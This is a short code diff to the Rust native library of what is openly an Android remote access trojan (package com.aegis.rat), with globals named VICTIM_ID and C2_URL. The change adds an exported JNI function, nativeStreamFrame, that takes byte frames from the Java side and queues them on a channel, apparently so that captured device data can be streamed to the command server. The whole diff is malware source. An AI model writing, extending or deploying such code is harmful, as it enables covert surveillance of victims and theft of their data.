@@ -4,6 +4,8 @@ use jni::sys::{jstring, jboolean, JNI_TRUE};
 use once_cell::sync::Lazy;
 use std::sync::Mutex;
 use tokio::runtime::Runtime;
+use std::sync::Arc;
+use tokio::sync::mpsc;
 
 mod comms;
 mod sysinfo;
@@ -17,6 +19,8 @@ static VICTIM_ID: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
 static C2_URL: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
 static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mutex::new(None));
 static CONTEXT: Lazy<Mutex<Option<JObject>>> = Lazy::new(|| Mutex::new(None));
+static STREAM_TX: Lazy<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>> = Lazy::new(|| Mutex::new(None));
+
 
 /// Attaches the current native thread to the JVM.
 /// This is required to call Java methods (like nativeGetRealLocation) from Rust async code.
@@ -26,7 +30,33 @@ fn attach_jvm() -> Result<JNIEnv, String> {
     };
     attached.map_err(|e| format!("Failed to attach JVM: {}", e))
 }
+pub fn register_stream_sender(tx: mpsc::UnboundedSender<Vec<u8>>) {
+    let mut lock = STREAM_TX.lock().unwrap();
+    *lock = Some(tx);
+}
+#[no_mangle]
+pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeStreamFrame(
+    mut env: JNIEnv,
+    _class: JClass,
+    data: jni::objects::JByteArray,
+) {
+    // 1. Convert Java byte[] to Rust Vec<u8>
+    let bytes: Vec<u8> = env.convert_local_ref_to_slice(&data)
+        .ok()
+        .map(|slice| slice.to_vec())
+        .unwrap_or_default();
 
+    if bytes.is_empty() {
+        return;
+    }
+
+    // 2. Get the active sender
+    let sender_lock = STREAM_TX.lock().unwrap();
+    if let Some(sender) = sender_lock.as_ref() {
+        // Send the frame. If the channel is full or closed, drop the frame.
+        let _ = sender.send(bytes);
+    }
+}
 #[no_mangle]
 pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
     mut env: JNIEnv,
